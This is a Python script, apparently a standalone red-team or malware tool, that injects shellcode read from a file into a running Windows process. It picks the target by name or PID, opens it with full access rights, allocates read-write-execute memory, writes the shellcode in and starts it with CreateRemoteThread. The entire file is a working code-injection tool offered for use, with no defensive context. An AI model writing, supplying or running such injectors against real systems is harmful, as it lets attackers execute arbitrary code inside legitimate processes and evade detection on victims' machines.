from ctypes import *
from sys import exit
import psutil
import argparse

def get_pid(proc_name):
    try:
        for proc in psutil.process_iter():
            #print(proc.name())
            if proc_name == proc.name():
                return proc.pid
        return None
    except (psutil.AccessDenied, PermissionError):
        pass

if __name__ == '__main__':
    parser = argparse.ArgumentParser(description='A simple process injection technique by calling CreateRemoteThread.')
    parser.add_argument('File', help='File name to read shell code from.')
    parser.add_argument('-p', '--process', help='Process name.', metavar='<process name>')
    parser.add_argument('-P', '--pid', help='Unique process id.', metavar='<PID>')
    args = parser.parse_args()

    if args.process and args.pid:
        print('Syntax error.')
        print(parser.print_help())
        exit()
    elif args.process:
        pid = get_pid(args.process)
    elif args.pid:
        pid = args.pid
    else:
        print('Syntax error.')
        print(parser.print_help())
        exit()

    try:
        shellcode = open(args.File, 'rb').read()
    except FileNotFoundError:
        print(f'File {args.File} not found.')
        exit()
    
    process_rights = 0x1F0FFF #All access permissions: https://www.aldeid.com/wiki/Process-Security-and-Access-Rights
    rwx_perms = 0x40 #Memory protection PAGE_EXECUTE_READWRITE: https://docs.microsoft.com/en-us/windows/win32/memory/memory-protection-constants
    MEM_COMMIT = 0x00001000 #https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex
    ker32 = windll.kernel32
    shellcode_len = len(shellcode) + 2

    handler = ker32.OpenProcess(process_rights, False, pid) #Get an handler for the remote process by it's pid.
    memory_alloc = ker32.VirtualAllocEx(handler, 0, shellcode_len, MEM_COMMIT, rwx_perms) #Allocate memory for the shellcode by the shellcode length
    ker32.WriteProcessMemory(handler, memory_alloc, shellcode, shellcode_len, 0) #Write the shellcode into the allocated memory
    thread_hanlder = ker32.CreateRemoteThread(handler, None, 0, memory_alloc, 0, 0, 0) #Create the remote thread, runnning the shellcode.
    thread_id = ker32.GetThreadId(thread_hanlder) #Get remote thread ID.
    if thread_id:
        print(f'''
[*] Code injection complete!
[*] Remote process id: {pid}.
[*] Shell code length: {shellcode_len}.
[*] Remote Thread id: {thread_id}.
        ''')
